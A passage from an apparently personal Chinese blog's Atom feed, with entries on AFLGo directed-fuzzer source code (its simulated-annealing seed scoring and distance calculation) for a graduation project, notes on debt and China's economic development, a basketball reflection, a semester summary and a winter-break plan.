href="https://bbs.pediy.com/thread-265936.htm#msg_header_h1_2">https://bbs.pediy.com/thread-265936.htm#msg_header_h1_2</a>  </li><li><a href="https://paper.seebug.org/1732/#afl-afl-asc">https://paper.seebug.org/1732/#afl-afl-asc</a></li><li><a href="https://www.anquanke.com/post/id/250540#h2-5">https://www.anquanke.com/post/id/250540#h2-5</a></li><li><a href="https://linux.cmsblogs.cn/">https://linux.cmsblogs.cn/</a>    —-查询linux命令的网站</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AFLGo源码阅读&quot;&gt;&lt;a href=&quot;#AFLGo源码阅读&quot; class=&quot;headerlink&quot; title=&quot;AFLGo源码阅读&quot;&gt;&lt;/a&gt;AFLGo源码阅读&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#aflgo%E6%BA%90%E7%A0%81%E9</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
  <entry>
    <title>中国政府与经济发展</title>
    <link href="https://laobameishijia.github.io/2022/01/20/zhong-guo-zheng-fu-yu-jing-ji-fa-zhan/"/>
    <id>https://laobameishijia.github.io/2022/01/20/zhong-guo-zheng-fu-yu-jing-ji-fa-zhan/</id>
    <published>2022-01-20T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中国政府与经济发展"><a href="#中国政府与经济发展" class="headerlink" title="中国政府与经济发展"></a>中国政府与经济发展</h1><p>探究中国经济的发展，不能割裂开政府的作用。因为在我国，政府不但影响蛋糕的分配，也参与蛋糕的生产。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220120193437.png" alt="财税与政府行为"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220123192820.png" alt="土地财政与土地金融"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="关于债务到底在中国经济发展中起到了什么作用？"><a href="#关于债务到底在中国经济发展中起到了什么作用？" class="headerlink" title="关于债务到底在中国经济发展中起到了什么作用？"></a>关于债务到底在中国经济发展中起到了什么作用？</h3><p>举个例子，假如说</p><ul><li>A用100买了B的某个产品</li><li>B用这100支付给了C作为孩子上学的学费</li><li>C又用100发给了A作为工资</li></ul><p>那在这个过程中，经济发展了吗？</p><p>再比如</p><ul><li>A用100买了B的某个产品</li><li>B用这100支付给了C, 因为B之前欠C 100</li><li>C又用100发给了A作为工资</li></ul><p>在这个过程中，流通的钱还是100, 但是B已经还清了自己的债务。那这个过程中经济发展了吗？</p><blockquote><p>我觉得从自己举出的这个例子中，并不是很能看出过程中是否有社会财富的积累。</p></blockquote><hr><p>关于债务在经济发展中的作用，我在知乎上找到了一个非常形象的描述。</p><p>作者的主页 <a href="https://www.zhihu.com/people/he-jia-lei-80">https://www.zhihu.com/people/he-jia-lei-80</a></p><p><strong>现代世界经济发展，主要是靠债务驱动，通过扩大信贷来扩大整个市场。</strong></p><p>怎么理解这句话呢？我们回过头看看贵金属货币时期，社会的经济规模直接取决于贵金属的总量，想想看，本来有一块地方，有丰富的资源，但因为没有足够的贵金属货币，所以只能晾在那，贵金属的开采量限制了经济的发展。</p><p>后来犹太人就发明了债务货币化，简单来讲就是以贵金属货币或贵金属本位纸币为锚，利用存款派生来撬动整个市场规模，我就直接拿现代的例子来解释说明吧：现在有个菜农，还有一个建筑师，菜农想要请建筑师建一个房子，需要100万元，但菜农没那么多钱于是找银行申请贷款，贷款了100万通过电子转账给建筑师，这时候银行并不需要真的用到100万的现金，只需要在账户上操作下，这时候建筑师的电子账户瞬间多了100万，于是他给菜农建了一套房子，而菜农接下来的30年时间为了还款，于是不停的种菜卖菜，而建筑师因为有了100万的收入于是每天都找菜农买菜（也是通过电子转账），30年过后，债务还清了。</p><p>而这债务从发生到消亡的过程，社会上多了一个价值100万的房子，跟总值100万的菜，总共200万的产值（GDP），数倍于债务本身的产值。</p><h4 id="经济发展"><a href="#经济发展" class="headerlink" title="经济发展"></a>经济发展</h4><p>就当代经济而言，发展的含义相当丰富复杂。发展总是与发达、与工业化、与现代化、与增长之间交替使用。 一般来说，经济发展包括三层含义：<br>1.经济量的增长，即一个国家或地区产品和劳务的增加，它构成了经济发展的物质基础；<br>2.经济结构的改进和优化，即一个国家或地区的技术结构、产业结构、收入分配结构、消费结构以及人口结构等经济结构的变化；<br>3.经济质量的改善和提高，即一个国家和地区经济效益的提高、经济稳定程度、卫生健康状况的改善、自然环境和生态平衡以及政治、文化和人的现代化进程。<br>经济发展是通过经济结构的改进和优化、经济质量的改善和提高达到经济量的增长。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220123200009.png" alt="图解GDP"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中国政府与经济发展&quot;&gt;&lt;a href=&quot;#中国政府与经济发展&quot; class=&quot;headerlink&quot; title=&quot;中国政府与经济发展&quot;&gt;&lt;/a&gt;中国政府与经济发展&lt;/h1&gt;&lt;p&gt;探究中国经济的发展，不能割裂开政府的作用。因为在我国，政府不但影响蛋糕的分配，也参与</summary>
      
    
    
    
    <category term="财经" scheme="https://laobameishijia.github.io/category/%E8%B4%A2%E7%BB%8F/"/>
    
    
    <category term="中国经济发展" scheme="https://laobameishijia.github.io/tag/%E4%B8%AD%E5%9B%BD%E7%BB%8F%E6%B5%8E%E5%8F%91%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码阅读-4</title>
    <link href="https://laobameishijia.github.io/2022/01/19/bi-she-fuzz-aflgo-yuan-ma-yue-du-4/"/>
    <id>https://laobameishijia.github.io/2022/01/19/bi-she-fuzz-aflgo-yuan-ma-yue-du-4/</id>
    <published>2022-01-19T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="毕设-Fuzz-AFLGo源码阅读-4"><a href="#毕设-Fuzz-AFLGo源码阅读-4" class="headerlink" title="毕设-Fuzz-AFLGo源码阅读-4"></a>毕设-Fuzz-AFLGo源码阅读-4</h1><h2 id="AFLGo在AFL的基础上的改进"><a href="#AFLGo在AFL的基础上的改进" class="headerlink" title="AFLGo在AFL的基础上的改进"></a>AFLGo在AFL的基础上的改进</h2><p>添加了模拟退火算法, 根据种子距离目标节点的距离来</p><h3 id="1-具体的距离目标taget的距离是怎么计算的"><a href="#1-具体的距离目标taget的距离是怎么计算的" class="headerlink" title="1. 具体的距离目标taget的距离是怎么计算的"></a>1. 具体的距离目标taget的距离是怎么计算的</h3><h3 id="2-模拟退火算法-是如何逐步退火？-amp-amp-是怎么挑选种子的？"><a href="#2-模拟退火算法-是如何逐步退火？-amp-amp-是怎么挑选种子的？" class="headerlink" title="2. 模拟退火算法, 是如何逐步退火？&amp;&amp; 是怎么挑选种子的？"></a>2. 模拟退火算法, 是如何逐步退火？&amp;&amp; 是怎么挑选种子的？</h3><p>AFL 的calculate_score函数是对 seed 进行打分，打分的分数决定对 seed fuzzing的时间长度，按照直觉来说，距离越近的 seed，有更大的概率能够到达目标点，则应该分配更多的时间给这些 seed。但是这样就会陷入上面所说的局部最优的困局里，于是 AFLGo 采用时间作为一个划分阶段的 metric，当 fuzzing 的时间在预定的时间内时，让时间较为公平的分配给每个 seed 上，当 fuzzing 时间超过了预定的时间后，时间就集中分配给哪些距离较近的 seed 上。这样可以在前期避免还未广泛探索就过度集中的局部最优的情况。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++"> u64 cur_ms &#x3D; get_cur_time(); u64 t &#x3D; (cur_ms - start_time) &#x2F; 1000;&#x2F;&#x2F; 计算当前运行时间 double progress_to_tx &#x3D; ((double) t) &#x2F; ((double) t_x * 60.0);&#x2F;&#x2F; 进度条，距离利用阶段的比例还有多少 double T; &#x2F;&#x2F;TODO Substitute functions of exp and log with faster bitwise operations on integers&#x2F;&#x2F; 这里根据fuzzing前的选项选择冷却时间的模型，是log函数，还是线性，还是指数等等 switch (cooling_schedule) &#123;   case SAN_EXP:     T &#x3D; 1.0 &#x2F; pow(20.0, progress_to_tx);     break;   case SAN_LOG:     &#x2F;&#x2F; alpha &#x3D; 2 and exp(19&#x2F;2) - 1 &#x3D; 13358.7268297     T &#x3D; 1.0 &#x2F; (1.0 + 2.0 * log(1.0 + progress_to_tx * 13358.7268297));     break;   case SAN_LIN:     T &#x3D; 1.0 &#x2F; (1.0 + 19.0 * progress_to_tx);     break;   case SAN_QUAD:     T &#x3D; 1.0 &#x2F; (1.0 + 19.0 * pow(progress_to_tx, 2));     break;   default:     PFATAL (&quot;Unkown Power Schedule for Directed Fuzzing&quot;); &#125; double power_factor &#x3D; 1.0; if (q-&gt;distance &gt; 0) &#123;    &#x2F;&#x2F; 首先归一化距离   double normalized_d &#x3D; 0; &#x2F;&#x2F; when &quot;max_distance &#x3D;&#x3D; min_distance&quot;, we set the normalized_d to 0 so that we can sufficiently explore those testcases whose distance &gt;&#x3D; 0.   if (max_distance !&#x3D; min_distance)     normalized_d &#x3D; (q-&gt;distance - min_distance) &#x2F; (max_distance - min_distance);   if (normalized_d &gt;&#x3D; 0) &#123;       double p &#x3D; (1.0 - normalized_d) * (1.0 - T) + 0.5 * T;&#x2F;&#x2F; 计算p值，由距离和时间共同决定       power_factor &#x3D; pow(2.0, 2.0 * (double) log2(MAX_FACTOR) * (p - 0.5));&#x2F;&#x2F; 最后根据p值计算得到factor，   &#125;&#x2F;&#x2F; else WARNF (&quot;Normalized distance negative: %f&quot;, normalized_d); &#125; perf_score *&#x3D; power_factor;&#x2F;&#x2F; 乘上factor得到最后的score<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>也就是说，得分score计算的公式是由距离和时间共同决定的，你要搞清楚，<strong>并不是每一次fuzz都会选择score分数最高的种子，而是分配更多的havoc时间给这样的seed</strong>。刚开始种子是比较公平的分配到每个seed，这类似–无差别探索阶段。后来，当预定的时间已过。距离较近的seed就会拥有更高的分数，从而在固定的时间段内占有更长时间的havoc，以增加到达taget的几率。</p></blockquote><h3 id="3-一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？"><a href="#3-一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？" class="headerlink" title="3. 一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？"></a>3. 一个是函数距离，一个是基本块之间的距离，这两个距离之间是如何作用的呢？</h3><p>先看一下什么叫做控制流图</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207203351.png" alt="控制流图CFG(Control Flow Graph)"></p><p>这两个是从源码角度分析的</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207211040.png" alt="函数距离计算公式"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207211712.png" alt="BB-Distance距离计算公式"></p><blockquote><p>结合的地方<br>Also, for each basic block in control flow graph of current function, we collect all functions it calls using <code>BBcalls.txt</code>. Among these functions that have <code>cg_distance</code>, AFLGO get the minimum of these and set <code>bb_distance</code> to it.</p></blockquote><p>下面这两个估计是从论文角度分析的，那可能源码在实现上和论文有一定的区别。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207212823.png" alt="函数层面距离计算"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220207212850.png" alt="基本块层面距离计算"></p><h3 id="4-我应该怎么设计我的算法？"><a href="#4-我应该怎么设计我的算法？" class="headerlink" title="4. 我应该怎么设计我的算法？"></a>4. 我应该怎么设计我的算法？</h3><p>四个阶段</p><p>基于距离的模拟退火算法</p><ul><li>无差别探索阶段 Undifferentiated Exploration</li><li>短路径优先阶段 Short Path Priority</li></ul><p>基于基本块距离的模拟退火算法</p><ul><li>长路径探索    Long Path Exploration</li><li>长路径优先    Long Path Priority</li></ul><ol><li>设置<code>bb_passed</code> 记录当前种子经过的基本块的数量</li><li>设置<code>is_longpathexploration</code> 当前这个种子是不是在长路径探索阶段被探索过</li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="calibrate-case-函数"><a href="#calibrate-case-函数" class="headerlink" title="calibrate_case 函数"></a>calibrate_case 函数</h3><p>里面 this calculates cur_distance这个看不懂啊，has_new_bits函数中包括了下面计算max_distance和min_distance的代码，为什么这里又再次包含了一遍。</p><h3 id="程序中所谓的seed到底是什么？"><a href="#程序中所谓的seed到底是什么？" class="headerlink" title="程序中所谓的seed到底是什么？"></a>程序中所谓的seed到底是什么？</h3><p><strong>是不同的测试文件</strong>，不是像你像的那样，从这个测试文件中读取内容然后再将一条条的内容进行测试</p><h3 id="为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？"><a href="#为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？" class="headerlink" title="为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？"></a>为什么按照步骤执行ReadMe中的测试步骤，却不能生成dot文件呢？</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220221171732.png" alt="无法生成dot文件"></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>Sudo 的全称为：super user do。 顾名思义：干超级用户才能干的事！所以Sudo最常用的功能就是提升一个命名的执行权限。</p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。</p><h3 id="程序是如何保留debug信息的呢？"><a href="#程序是如何保留debug信息的呢？" class="headerlink" title="程序是如何保留debug信息的呢？"></a>程序是如何保留debug信息的呢？</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;毕设-Fuzz-AFLGo源码阅读-4&quot;&gt;&lt;a href=&quot;#毕设-Fuzz-AFLGo源码阅读-4&quot; class=&quot;headerlink&quot; title=&quot;毕设-Fuzz-AFLGo源码阅读-4&quot;&gt;&lt;/a&gt;毕设-Fuzz-AFLGo源码阅读-4&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
  <entry>
    <title>OneToOne-1</title>
    <link href="https://laobameishijia.github.io/2022/01/06/onetoone-1/"/>
    <id>https://laobameishijia.github.io/2022/01/06/onetoone-1/</id>
    <published>2022-01-06T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OneToOne-1"><a href="#OneToOne-1" class="headerlink" title="OneToOne-1"></a>OneToOne-1</h1><p>比赛时间：2022/1/4</p><p>不知不觉，已经到了大四上学期结束的时候了。跟狗子的单挑也从大一持续到了现在。 这学期的单挑，真的是没赢过啊。确实是有机会赢，但是自己没有把握住。虽然自己矮十几厘米，但是我还算比较有韧性把。很多时候，我都会怀疑自己会输。可总是会咬牙坚持到最后。尤其是最近刚刚打过的这次。</p><p>5局3胜制，我开局以0比2落后。面对比自己高比自己壮的人，我很难不产生一种要服输的心理。三分真的算是我位数不多的得分手段了，如果三分球投不进，我真的很难赢。我不断在心里默默地给自己加油，鼓励自己坚持下去。果然，连续翻了2局。</p><p>最后一局，也是打到了10比10平(11分制)。首先的球权是在我手里，但是我没有把握住机会。不知道为什么，在习惯了以三分作为自己的得分手段之后，以前我非常擅长的中距离变得非常陌生。没办法判断到底什么时机是合适的出手机会。所以啊，还是要继续努力才行。生活中比较庆幸地也是有这样的朋友把，大家就不断互相进步。</p><p>其实把，想赢的心理在我心中一直都有。只不过，确实有的时候会动摇。你会怀疑自己到底能不能赢。就像在面对生活中的困难一样，我觉得正常的人可能都会质疑自己是否能挺过难关，是否能真正地坚持下去。但无疑，坚持下去大多时候会有一个比自己预期要好的结果。就像这次单挑一样，0比2落后，我真的怀疑自己了。但是我心里告诉自己，一定要坚持下去，没有结束，凭什么就这么服输，三分不可能一直投不进。</p><p>我经常会以这些看似鸡汤话鼓励一些在生活中过的不那么如意的人，<strong>有些人总是会说: 只不过是你运气好罢了。</strong> 我觉得他们说的很正确，之所以我有今天的价值观，无非是在我的经历中，坚持下去的做法带来了较多积极的效果。 即使是这样，我仍不觉得我鼓励别人积极乐观地生活是错的，因为我觉得，坚持下去的结果总比放弃的结果好。<strong>哪怕你这次说我没有站在你的角度上思考问题，下次我还是会这么鼓励你。</strong></p><p>回想一下，从刚上大学到现在，坚持练球的过程真的带给我很多生活中的道理。从习惯性一个人为了自己的目标努力，到不因为眼前的困难而放弃，到如何在别人的嘲笑下依旧坚持自己，再到学会把眼光放得长远。我不知道是不是每个打球的人都能体会到这些，但显然善于体味生活的人一定会从中得到很多属于自己的故事。</p><p><strong>我的高中班主任曾经说我打球的原因，就是想耍帅。</strong>但事实是，我经常性地自己练球。 也并没有因此获得什么可以拿的出手的成绩。 可这些并没有影响到我对于篮球的喜爱。 还是那句话，我不是为了打败谁，也不是想成为像NBA球星一样的人物。 我的目标很简单：就是完成自己给自己设定的目标，也许这个目标在有些人看来不值一提。 可是我相信，慢慢地努力，总会达到我想要的效果。现实也正是如此。</p><p>很幸运，我遇到了篮球。要真的追想的话，也不知道具体自己什么时间就喜欢上了篮球。那种不求任何结果，慢慢享受打球过程和眼看着自己慢慢进步的感觉真的很美妙。 可惜，我在我专业课程的学习上并没有这种劲头。 我也喜欢，但没有那种痴迷式的喜欢。 造成的结果也清楚， 我只是比一部分人做得好，但成为不了那种比绝大部分人做得好的人。 哪怕我自己清楚这一点， 还是跟篮球一样， 我不是为了要比谁强，比谁更优秀，我只是像完成自己对自己设定的目标。</p><hr><p>老早就想写这样的总结了，还是往后拖了几天…. 也不知道自己写了点啥， 反正就当给生活留个纪念吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OneToOne-1&quot;&gt;&lt;a href=&quot;#OneToOne-1&quot; class=&quot;headerlink&quot; title=&quot;OneToOne-1&quot;&gt;&lt;/a&gt;OneToOne-1&lt;/h1&gt;&lt;p&gt;比赛时间：2022/1/4&lt;/p&gt;
&lt;p&gt;不知不觉，已经到了大四上学期结束的</summary>
      
    
    
    
    <category term="篮球" scheme="https://laobameishijia.github.io/category/%E7%AF%AE%E7%90%83/"/>
    
    
    <category term="OneToOne" scheme="https://laobameishijia.github.io/tag/OneToOne/"/>
    
  </entry>
  
  <entry>
    <title>大四上学期总结</title>
    <link href="https://laobameishijia.github.io/2022/01/06/da-si-shang-xue-qi-zong-jie/"/>
    <id>https://laobameishijia.github.io/2022/01/06/da-si-shang-xue-qi-zong-jie/</id>
    <published>2022-01-06T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.204Z</updated>
    
    <content type="html"><![CDATA[<p>既然是学期总结，那总得说点自己的进步和值得记忆的事情吧。</p><p>首先。还是没有找到女朋友，<strong>一 我接触的女生确实不多</strong>，有的时候，我也很纳闷，在接触的女生中就没有一个可以使自己心动的？ 前端时间，一个关系非常好的女同学向我表白，但我真的是没有男女的情感在里面。于是我拒绝了她，不过好在大家的关系也并没有因此显的很尴尬。<strong>二 我并没有很想谈恋爱</strong> 我有我自己的生活，习惯了一个人做事情，反倒不太习惯两个人。 <strong>三 缺乏勇气</strong>  我必须承认自己是一个缺乏勇气的人，在路上看到有些稍微心动的女生，不敢上去要个微信。也许要了也是白要，我总是这样告诉自己。</p><p>接着。就是保研，这个东西确实是个惊喜吧，也确实有运气成分再里面。 我并不认为自己和优秀能扯上关系，至少在学习方面是这样的。</p><p>然后。自己把三分球慢慢地练出来了，也找到了算是比较合适的训练方法。虽然命中率还是不稳定，有的时候还是比较准的。</p><p>还有。 学着去看书，以前我总觉得看书没啥用，在静下心来去阅读一些书籍的生活，才发现，书真的是跟优秀人交流非常好的方式。如果你的生活中没有一些很厉害的人能和你交流，我觉得看他写的书，多多少少还是有些收获的。那就不能不提我看书最大的一个收获就是:<strong>不要轻易地下结论，无论是对人还是对事。</strong> 因为感觉很多事情，远远比我想象中的要复杂，或者即使它很简单，在执行的过程中依然会遇到各种非常难以解决和调和的问题。 另外就是哲学家真的很厉害，尤其是罗素*–ps 看过&lt;幸福之路&gt;，虽然没记住多少，心灵还是很受震撼的*</p><p>emm。 结交了一个非常优秀的朋友，人长得又高又帅。努力拼搏，对自己未来有规划。不像俺，没啥清晰的目标，还不如人家勤奋。</p><p>最后。 2021年的最后一天去欢乐谷体验了一把大摆锤。就是那种摆上去又把你摆下来的，不得不说，要不是没有我朋友鼓励，我还真的不敢坐。也算是挑战了自己一把，不过我还是暗暗发誓：我再也不做了。</p><p>至于活动方面，参与过学校人大换届选举，也当过核酸检测的志愿者。这些活动也更加证实我从书中获得的收获—:<strong>不要轻易地下结论，无论是对人还是对事。</strong> 动不动就开始吐槽和埋怨，既不利于事情的解决，也容易陷入片面思考的误区。</p><p>至于照片，寒假有空就把自己手机当中的照片整理一下把。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;既然是学期总结，那总得说点自己的进步和值得记忆的事情吧。&lt;/p&gt;
&lt;p&gt;首先。还是没有找到女朋友，&lt;strong&gt;一 我接触的女生确实不多&lt;/strong&gt;，有的时候，我也很纳闷，在接触的女生中就没有一个可以使自己心动的？ 前端时间，一个关系非常好的女同学向我表白，但我真的</summary>
      
    
    
    
    <category term="学期总结" scheme="https://laobameishijia.github.io/category/%E5%AD%A6%E6%9C%9F%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="大四上" scheme="https://laobameishijia.github.io/tag/%E5%A4%A7%E5%9B%9B%E4%B8%8A/"/>
    
  </entry>
  
  <entry>
    <title>大四上寒假计划</title>
    <link href="https://laobameishijia.github.io/2022/01/06/da-si-shang-han-jia-ji-hua/"/>
    <id>https://laobameishijia.github.io/2022/01/06/da-si-shang-han-jia-ji-hua/</id>
    <published>2022-01-06T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.204Z</updated>
    
    <content type="html"><![CDATA[<p>寒假计划</p><ul><li><input checked="" disabled="" type="checkbox"> 力量训练–争取每一次都做到训练的标准，而不是消耗性的运动</li><li><input disabled="" type="checkbox"> 毕设一定要稳步推进</li><li><input disabled="" type="checkbox"> 学会做更多的菜，尝试去做蛋糕</li><li><input disabled="" type="checkbox"> 多跟着奶奶置办一些年货</li><li><input checked="" disabled="" type="checkbox"> 去走动亲戚，尤其是那种好几年都没回来过的。<strong>不要找一些冠冕堂皇的借口，其实你就是懒！</strong></li><li><input checked="" disabled="" type="checkbox"> 不要跟家里人生气，争取一次都不要</li><li><input checked="" disabled="" type="checkbox"> 再配一副眼镜，去体育公园打打球</li><li><input checked="" disabled="" type="checkbox"> 买到自己想要的新年衣服</li><li><input checked="" disabled="" type="checkbox"> 留意一下家里有没有什么合适的女朋友 😀~~~ (？！我劝你好自为之)</li></ul><p>暂时就是这些，希望寒假回来的时候，能都打上√</p><p>首先是毕设的问题，在自己家真的不是什么适合学习的地方, 但是也不能说啥也没看, 但只是进度非常慢。</p><p>奶奶在家，很多东西其实也是爷爷和奶奶自己做的。有的时候把，我也不是不想帮忙，只是我也不知道自己应该干什么。由于经常去奶奶家吃饭, 做饭这个计划就又搁置啦。~~~</p><p>这个寒假，明显感觉到我对待家里人多了几分耐心。 这也说明，我心性有那么一点点的进步。</p><p>女朋友也确实留意了，虽然我非常不愿意承认自己以貌取人，但是我终究还是没逃过这一点。说到底，咱还是。。。😀</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;寒假计划&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; 力量训练–争取每一次都做到训练的标准，而不是消耗性的运动&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;</summary>
      
    
    
    
    <category term="寒假计划" scheme="https://laobameishijia.github.io/category/%E5%AF%92%E5%81%87%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="大四上" scheme="https://laobameishijia.github.io/tag/%E5%A4%A7%E5%9B%9B%E4%B8%8A/"/>
    
  </entry>
  
  <entry>
    <title>毕设-Fuzz-AFLGo源码阅读-3</title>
    <link href="https://laobameishijia.github.io/2022/01/02/bi-she-fuzz-aflgo-yuan-ma-yue-du-3/"/>
    <id>https://laobameishijia.github.io/2022/01/02/bi-she-fuzz-aflgo-yuan-ma-yue-du-3/</id>
    <published>2022-01-02T09:25:00.000Z</published>
    <updated>2022-08-04T10:38:04.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="毕设-Fuzz-AFLGo源码阅读-3"><a href="#毕设-Fuzz-AFLGo源码阅读-3" class="headerlink" title="毕设-Fuzz-AFLGo源码阅读-3"></a>毕设-Fuzz-AFLGo源码阅读-3</h1><h2 id="AFL框架"><a href="#AFL框架" class="headerlink" title="AFL框架"></a>AFL框架</h2><h3 id="共享内存中的bitmap结构-amp-amp-forkserver机制"><a href="#共享内存中的bitmap结构-amp-amp-forkserver机制" class="headerlink" title="共享内存中的bitmap结构 &amp;&amp; forkserver机制"></a>共享内存中的bitmap结构 &amp;&amp; forkserver机制</h3><p>不太好描述，就直接放图上来了。  —其他的都写到注释里面了</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220118215515.jpg" alt="共享内存中的bitmap结构&amp;&amp;forkserver机制"></p><h2 id="Linux-C"><a href="#Linux-C" class="headerlink" title="Linux C"></a>Linux C</h2><h3 id="进程之间的信号是如何进行传递的"><a href="#进程之间的信号是如何进行传递的" class="headerlink" title="进程之间的信号是如何进行传递的"></a>进程之间的信号是如何进行传递的</h3><p>直接看下面的链接把</p><p><a href="https://www.bookstack.cn/read/linux-c/5016547c13b140cc.md#6b906b">https://www.bookstack.cn/read/linux-c/5016547c13b140cc.md#6b906b</a></p><h3 id="控制台和终端的关系"><a href="#控制台和终端的关系" class="headerlink" title="控制台和终端的关系"></a>控制台和终端的关系</h3><p><a href="https://www.cnblogs.com/sparkdev/p/11460821.html">https://www.cnblogs.com/sparkdev/p/11460821.html</a></p><p>在计算机里，把那套直接连接在电脑上的键盘和显示器就叫做控制台。而终端是通过串口连接上的，不是计算机自身的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。这同样说明，控制台是计算机的基本设备，而终端是附加设备。计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。比如在启动和关闭 Linux 系统时，我们可以在控制台上看到很多的内核信息(下图来自 vSphere Client 中的 “Virtual Machine Console”)</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220103170553.png" alt="控制台"></p><p>现在终端和控制台都由硬件概念，逐渐演化成了软件的概念。<strong>简单的说，能直接显示系统消息的那个终端称为控制台，其他的则称为终端(控制台也是一个终端)。或者我们在平时的使用中压根就不区分 Linux 中的终端与控制台。</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220103171552.png" alt="Linux上的终端"></p><h3 id="dev-urandom-dev-null"><a href="#dev-urandom-dev-null" class="headerlink" title="/dev/urandom /dev/null"></a>/dev/urandom /dev/null</h3><p>一个是随机数生成器, 另一个相当于空文件, 所有定向到这个地方的输入都会消失。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;毕设-Fuzz-AFLGo源码阅读-3&quot;&gt;&lt;a href=&quot;#毕设-Fuzz-AFLGo源码阅读-3&quot; class=&quot;headerlink&quot; title=&quot;毕设-Fuzz-AFLGo源码阅读-3&quot;&gt;&lt;/a&gt;毕设-Fuzz-AFLGo源码阅读-3&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="毕设" scheme="https://laobameishijia.github.io/category/%E6%AF%95%E8%AE%BE/"/>
    
    
    <category term="Fuzz" scheme="https://laobameishijia.github.io/tag/Fuzz/"/>
    
    <category term="AFLGo" scheme="https://laobameishijia.github.io/tag/AFLGo/"/>
    
  </entry>
  
</feed>
